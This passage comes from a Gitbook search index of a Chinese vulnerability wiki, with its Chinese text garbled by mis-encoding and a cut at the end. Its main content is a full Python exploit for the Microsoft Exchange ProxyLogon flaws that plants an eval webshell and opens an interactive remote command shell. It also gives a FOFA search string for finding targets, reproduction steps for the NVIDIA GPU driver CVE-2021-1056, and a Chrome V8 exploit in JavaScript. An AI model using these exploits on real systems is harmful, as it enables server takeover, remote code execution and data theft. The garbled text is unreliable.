ServerÂèØ‰ª•Ë¢´Áî®Êù•ÊûÑÊû∂Â∫îÁî®‰∫é‰ºÅ‰∏ö„ÄÅÂ≠¶Ê†°ÁöÑÈÇÆ‰ª∂Á≥ªÁªüÊàñÂÖçË¥πÈÇÆ‰ª∂Á≥ªÁªü„ÄÇ2021Âπ¥03Êúà03Êó•ÂæÆËΩØÂÆòÊñπÊä´Èú≤Â§ö‰∏™ExchangeÈ´òÂç±ÊºèÊ¥ûÔºö CVE-2021-26855 ExchangeÊúçÂä°Âô®Á´ØËØ∑Ê±Ç‰º™ÈÄ†ÊºèÊ¥û„ÄÇÂà©Áî®Ê≠§ÊºèÊ¥ûÁöÑÊîªÂáªËÄÖËÉΩÂ§ü‰ª•Exchange ServerÂèëÈÄÅHTTPËØ∑Ê±ÇÔºåÊâ´ÊèèÂÜÖÁΩëÔºåËé∑ÂèñExchangeÁî®Êà∑‰ø°ÊÅØ„ÄÇ CVE-2021-26857 ExchangeÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇËØ•ÊºèÊ¥ûÈúÄË¶ÅÁÆ°ÁêÜÂëòÊùÉÈôêÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÊÅ∂ÊÑèËØ∑Ê±ÇÔºåËß¶ÂèëÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂú®ÊúçÂä°Âô®‰∏äÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å„ÄÇ CVE-2021-26858/CVE-2021-27065 Exchange‰∏≠Ë∫´‰ªΩÈ™åËØÅÂêéÁöÑ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥û„ÄÇÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáCVE-2021-26855ÁöÑssrfÊºèÊ¥ûËé∑ÂèñÂà∞ÁöÑExchange administratorÂá≠ËØÅÔºåÊûÑÈÄ†ÊÅ∂ÊÑèËØ∑Ê±ÇÔºåÂú®Á≥ªÁªü‰∏äÂÜôÂÖ•‰ªªÊÑèÊñá‰ª∂„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Exchange 2013 Versions Exchange 2016 CU18 Exchange 2016 CU19 Exchange 2019 CU7 Exchange 2019 CU8 FOFA [!NOTE] icon_hash=\"1768726119\" ÊºèÊ¥ûÂ§çÁé∞ 4ÁØáÂÖ≥‰∫éÂéüÁêÜÁöÑÂèÇËÄÉÊñáÁ´† https://www.praetorian.com/blog/reproducing-proxylogon-exploit/ https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/ https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ [!NOTE] ÂÖ∂‰∏≠‰∏ÄÊ¨°ÊîªÂáª‰∏≠ÁöÑÊó•Âøó ÂèØ‰ª•ÁúãÂà∞È¶ñÂÖàËØ∑Ê±Ç‰∫Ü /rpc/ Ëøô‰∏™ÁõÆÂΩï Ê†πÊçÆÁΩë‰∏äÂÖ¨Â∏ÉÁöÑ POC‰∏éEXPÔºåÂèØ‰ª•ÁúãÂà∞ NTMLÂçèÂïÜÊ∂àÊÅØ‰ºöËøîÂõûÊàë‰ª¨NTMLËØ¢ÈóÆ‰ø°ÊÅØÔºå ÂÖ∂‰∏≠ÂåÖÂê´‰∫Ü AV_PAIRÁªìÊûÑÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∫Ü ÂêéÁ´ØÊúçÂä°Âô®ÂêçÁß∞‰∏éÂüüÂêç base64Ëß£ÂØÜÂÖ∂‰∏≠ÁöÑÂä†ÂØÜÈÉ®ÂàÜ Âú®ÈÄöËøáËß£ÂåÖÁöÑÊñπÊ≥ïËΩ¨Êç¢ÂÖ∂‰∏≠ÁöÑÊï∞ÊçÆÂ∞±ÂèØ‰ª•ÂæóÂà∞ÂÆåÊï¥ÁöÑÂêéÁ´ØÊúçÂä°Âô®ÂêçÁß∞‰∏éÂüüÂêç ÂêéÈù¢ÁöÑÂ§ßÂÆ∂Â∞±ÂèÇËÄÉÊñáÁ´†ÂíåEXPÊù•Á†îÁ©∂ÂéüÁêÜÂêßÔºåÂá†ÁØáÊñáÁ´†ÂíåEXPÂ∑≤ÁªèÂæàÂÆåÊï¥‰∫Ü ÊºèÊ¥ûÂà©Áî®POC [!NOTE] EXPÊ†πÊçÆÊé®ÁâπÂíåGithubÂá†‰∏™ËÑöÊú¨Êõ¥Êîπ ÈªòËÆ§ÊâìÁöÑÈÇÆÁÆ±‰∏∫ administrator@xxx.xxx.cn(ÂèØ‰ª•Ëá™Ë°åÊõ¥Êîπ) webshellË∑ØÂæÑÂíåËÑöÊú¨Êñá‰ª∂‰∏≠Êõ¥Êîπ ËøêË°åÁöÑÂëΩ‰ª§ÊòØ ping DnslogËØÅÊòéÊºèÊ¥ûÂ≠òÂú®(‰∏Ä‰∫õ‰∏úË•øÂ∞±Â§ßÂÆ∂Ëá™Â∑±ÁúãÁúãËÑöÊú¨ÊîπÂêß~) #!/usr/bin/python2 # coding: UTF-8 import re import sys import json import string import requests from urllib import urlencode from tld import get_fld from struct import unpack from base64 import b64encode, b64decode from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Microsoft Exchang Â§ö‰∏™ÁâàÊú¨ \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python poc.py \\033[0m') print('+ \\033[36mUrl >>> mail.xxx.org \\033[0m') print('+ \\033[36mEmail >>> Administrator@Ê†πÂüüÂêç (ÈªòËÆ§) \\033[0m') print('+------------------------------------------') def _unpack_str(byte_string): return byte_string.decode('UTF-8').replace('\\x00', '') def _unpack_int(format, data): return unpack(format, data)[0] def parse_challenge(Negotiate_base64_decode): target_info_field = Negotiate_base64_decode[40:48] target_info_len = _unpack_int('H', target_info_field[0:2]) target_info_offset = _unpack_int('I', target_info_field[4:8]) target_info_bytes = Negotiate_base64_decode[target_info_offset:target_info_offset + target_info_len] domain_name = '' computer_name = '' info_offset = 0 while info_offset %s http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a ''' % Email vuln_url = '/autodiscover/autodiscover.xml' headers = { 'User-Agent': 'ExchangeServicesClient/0.0.0.0', 'Content-Type': 'text/xml', 'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'msExchLogonMailbox': 'S-1-5-20' } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) LegacyDN = re.findall(r'(.*?)', response.text)[0] print(\"\\033[32m[o] LegacyDN: {}\\033[0m\".format(LegacyDN)) vuln_url = '/mapi/emsmdb/' headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'Content-Type': 'application/mapi-http', 'msExchLogonMailbox': 'S-1-5-20', } payload = LegacyDN + '\\x00\\x00\\x00\\x00\\x00\\x20\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00' url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) SID = re.search('with SID ([S\\-0-9]+) ', response.content).group(1) print(\"\\033[32m[o] SID: {}\\033[0m\".format(SID)) vuln_url = '/ecp/proxyLogon.ecp' payload = '%s' % (Email.split('@')[0], SID) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) session_id = response.cookies.get('ASP.NET_SessionId') canary = response.cookies.get('msExchEcpCanary') print(\"\\033[32m[o] Session_id: {}\\033[0m\".format(session_id)) print(\"\\033[32m[o] Canary : {}\\033[0m\".format(canary)) extra_cookies = [ 'ASP.NET_SessionId=' + session_id, 'msExchEcpCanary=' + canary ] vuln_url = '/ecp/DDI/DDIService.svc/GetObject' qs = urlencode({ 'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data='', verify=False, allow_redirects=False) identity = response.json()['d']['Output'][0]['Identity'] print(\"\\033[32m[o] OAB Name: {}\\033[0m\".format(identity['DisplayName'])) print(\"\\033[32m[o] OAB ID: {}\\033[0m\".format(identity['RawIdentity'])) FILE_PATH = 'C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\PeiQi.aspx' FILE_DATA = 'function Page_Load(){eval(Request[\"PeiQi\"],\"unsafe\");}' vuln_url = '/ecp/DDI/DDIService.svc/SetObject' qs = urlencode({ 'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary }) payload = json.dumps({ 'identity': { '__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity'] }, 'properties': { 'Parameters': { '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'ExternalUrl': 'http://f/' + FILE_DATA } } }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) if response.status_code == 200: print(\"\\033[32m[o] ÈÄöËøáOABËÆæÁΩÆWebshellÊàêÂäü\\033[0m\") vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode({ 'schema': 'ResetOABVirtualDirectory', 'msExchEcpCanary': canary }) payload = json.dumps({ 'identity': { '__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity'] }, 'properties': { 'Parameters': { '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'FilePathName': FILE_PATH } } }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) if response.status_code == 200: print(\"\\033[32m[o] Ê≠£Âú®Â∞ùËØïÂÜôÂÖ•Webshell\\033[0m\") vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode({ 'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary }) payload = json.dumps({ 'identity': { '__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity'] }, 'properties': { 'Parameters': { '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'ExternalUrl': '' } } }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) print(\"\\033[32m[o] Ê∏ÖÈô§ OAB\\033[0m\") print(\"\\033[32m[o] Ê≠£Âú®È™åËØÅ WebshellÊòØÂê¶‰∏ä‰º†ÊàêÂäü..........\\033[0m\") webshell_url = \"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=webshell_url, verify=False, allow_redirects=False) if response.status_code == 200 and \"Name\" in response.text: print(\"\\033[32m[o] ‰∏ä‰º† WebshllÊàêÂäü, Âú∞ÂùÄ‰∏∫:{}\\033[0m\".format(\"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\")) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{}\\033[0m\".format(response.text)) while True: Cmd = str(raw_input(\"\\033[35mCmd >>> \\033[0m\")) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) Cmd_url = \"https://\" + target_url + '/aspnet_client/PeiQi.aspx?PeiQi=Response.Write(new%20ActiveXObject(\"WScript.Shell\").exec(\"cmd /c {}\").StdOut.ReadAll());'.format(Cmd) response = requests.get(url=Cmd_url, verify=False, allow_redirects=False) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{}\\033[0m\".format(response.text)) if __name__ == '__main__': reload(sys) sys.setdefaultencoding('utf8') title() target_url = str(raw_input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Email = \"Administrator@{}\".format(get_fld(\"https://\" + target_url)) print(\"\\033[32m[o] ËØ∑Ê±ÇÂú∞ÂùÄ:{}Ôºå‰ΩøÁî®ÁöÑÈÇÆÁÆ±:{}\\033[0m\".format(target_url, Email)) POC_1(target_url, Email) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/NVIDIA/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/NVIDIA/","title":"NVIDIA","keywords":"","body":"NVIDIA NVIDIA GPUÊòæÁ§∫È©±Âä®Á®ãÂ∫è ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2021-1056 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/NVIDIA/NVIDIA GPUÊòæÁ§∫È©±Âä®Á®ãÂ∫è ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2021-1056.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/NVIDIA/NVIDIA GPUÊòæÁ§∫È©±Âä®Á®ãÂ∫è ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2021-1056.html","title":"NVIDIA GPUÊòæÁ§∫È©±Âä®Á®ãÂ∫è ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2021-1056","keywords":"","body":"NVIDIA GPUÊòæÁ§∫È©±Âä®Á®ãÂ∫è ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2021-1056 ÊºèÊ¥ûÊèèËø∞ Áî®‰∫éLinuxÁöÑNVIDIA GPUÊòæÁ§∫È©±Âä®Á®ãÂ∫èÂú®ÂÜÖÊ†∏Ê®°ÂºèÂ±ÇÔºànvidia.koÔºâ‰∏≠ÂåÖÂê´‰∏Ä‰∏™ÊºèÊ¥ûÔºåÂú®ËØ•ÊºèÊ¥û‰∏≠ÔºåÂÆÉÊ≤°ÊúâÂÆåÂÖ®ÈÅµÂÆàÊìç‰ΩúÁ≥ªÁªüÊñá‰ª∂Á≥ªÁªüÊèê‰æõGPUËÆæÂ§áÁ∫ßÈöîÁ¶ªÁöÑÊùÉÈôêÔºåËøôÂèØËÉΩÂØºËá¥ÊãíÁªùÊúçÂä°Êàñ‰ø°ÊÅØÊ≥ÑÈú≤„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] NVIDIA GPUÊòæÁ§∫È©±Âä®Á®ãÂ∫è ÁéØÂ¢ÉÊê≠Âª∫ DokcerÁâàÊú¨: 19.03 git clone https://github.com/pokerfaceSad/CVE-2021-1056.git cd CVE-2021-1056 docker run --gpus 1 -v $PWD:/CVE-2021-1056 -it tensorflow/tensorflow:1.13.2-gpu bash ÊºèÊ¥ûÂ§çÁé∞ ËøõÂÖ•ÂÆπÂô®Ê£ÄÊü• GPUÁä∂ÊÄÅÔºåÂè™Êúâ‰∏ÄÂùóGPU In Container# nvidia-smi Sat Jan 9 07:21:03 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ Âú®ÂÆπÂô®‰∏≠ÊâßË°åÊºèÊ¥ûÂà©Áî®ËÑöÊú¨ÔºåÂú®ÊúÄÂêéÁöÑnvidia-smiÁöÑËæìÂá∫‰∏≠ÂèØ‰ª•ÁúãÂà∞ÂÆø‰∏ªÊú∫ÊâÄÊúâGPUÂú®ÂÆπÂô®‰∏≠ÈÉΩÂ∑≤ÁªèÂèØËßÅ‰∫Ü In Container# bash /CVE-2021-1056/main.sh [INFO] init GPU num: 1 [DEBUG] /dev/nvidia0 exists, skip [DEBUG] successfully get /dev/nvidia1 [DEBUG] successfully get /dev/nvidia2 [DEBUG] successfully get /dev/nvidia3 [DEBUG] delete redundant /dev/nvidia4 [INFO] get extra 3 GPU devices from host [INFO] current GPU num: 4 [INFO] exec nvidia-smi: Sat Jan 9 07:22:43 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000:03:00.0 Off | 0 | | N/A 30C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000:82:00.0 Off | 0 | | N/A 29C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000:83:00.0 Off | 0 | | N/A 28C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ ‰∏∫‰∫ÜÈ™åËØÅËøô‰∫õGPUÁ°ÆÂÆûÊòØÂèØÁî®ÁöÑÔºåÊâßË°å‰∏Ä‰∏™tensorflowÁöÑdemoÔºåÂèØ‰ª•ÁúãÂà∞ÊâÄÊúâÁöÑGPUÁ°ÆÂÆûÂèØ‰ª•Ë¢´ÂÆπÂô®‰∏≠ÁöÑËøõÁ®ã‰ΩøÁî® In Container# nohup python /CVE-2021-1056/tf_distr_demo.py > log 2>&1 & In Container$ nvidia-smi Sat Jan 9 18:58:23 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 32C P0 36W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000:03:00.0 Off | 0 | | N/A 33C P0 35W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000:82:00.0 Off | 0 | | N/A 33C P0 36W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000:83:00.0 Off | 0 | | N/A 32C P0 37W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| +-----------------------------------------------------------------------------+ ÂèÇËÄÉÊñáÁ´† https://github.com/pokerfaceSad/CVE-2021-1056/blob/master/docs/QuickStart.md Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/QEMU/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/QEMU/","title":"QEMU","keywords":"","body":"QEMU Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/QEMU/QEMU ËôöÊãüÊú∫ÈÄÉÈÄ∏ÊºèÊ¥û CVE-2020-14364.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/QEMU/QEMU ËôöÊãüÊú∫ÈÄÉÈÄ∏ÊºèÊ¥û CVE-2020-14364.html","title":"QEMU ËôöÊãüÊú∫ÈÄÉÈÄ∏ÊºèÊ¥û CVE-2020-14364","keywords":"","body":"QEMU ËôöÊãüÊú∫ÈÄÉÈÄ∏ÊºèÊ¥û CVE-2020-14364 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Chrome/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Chrome/","title":"Chrome","keywords":"","body":"Chrome Windows Chrome ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Chrome/Windows Chrome ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Chrome/Windows Chrome ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"Windows Chrome ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"Chrome ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Windows Chrome 0day Âú® 2021-4-13 Ë¢´ÂÖ¨ÂºÄ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Window Chrome ÊµèËßàÂô® ÊºèÊ¥ûÂ§çÁé∞ GithubÔºö https://github.com/r4j0x00/exploits/tree/master/chrome-0day Êé®Áâπ: https://twitter.com/r4j0x00/status/1381643526010597380?s=12 exp.html exp.js /* /* BSD 2-Clause License Copyright (c) 2021, rajvardhan agarwal All rights reserved. Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */ var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]) var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f = wasm_instance.exports.main; var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); let buf2 = new ArrayBuffer(0x150); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) > 32n); return f64_buf[0]; } const _arr = new Uint32Array([2**31]); function foo(a) { var x = 1; x = (_arr[0] ^ 0) + 1; x = Math.abs(x); x -= 2147483647; x = Math.max(x, 0); x -= 1; if(x==-1) x = 0; var arr = new Array(x); arr.shift(); var cor = [1.1, 1.2, 1.3]; return [arr, cor]; } for(var i=0;i ` Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Saltstack/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Saltstack/","title":"Saltstack","keywords":"","body":"Saltstack Saltstack ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-11651/11652 SaltStack Êú™ÊéàÊùÉËÆøÈóÆÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-16846/25592 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Saltstack/Saltstack ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-11651 11652.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Saltstack/Saltstack ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-11651 11652.html","title":"Saltstack 